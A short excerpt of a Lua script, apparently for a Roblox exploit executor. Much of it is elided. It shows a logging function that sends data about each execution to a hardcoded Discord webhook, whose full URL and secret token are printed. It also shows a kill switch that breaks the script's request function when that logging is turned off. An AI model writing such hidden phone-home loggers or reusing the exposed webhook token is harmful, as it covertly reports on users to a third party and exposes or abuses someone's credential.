...
function die()
	task.spawn(function()
		...
		request = function(...) return print(grs(74) .. grs(74) .. grs(74)) end
...
function log()
	if logexecution == true then
		...
		local webhookUrl = "https://discord.com/api/webhooks/1396657284699918578/jfQkSwhRB7tGaHshq63Mxqz-B_cfGpZRIDXo9MyRCzmdJwgGt2JJAv2KuWFZYrJnfocB"
		local webhookData = createWebhookData()
...
noxious["note"] = "skidder no skidding!" if not logexecution then die() end
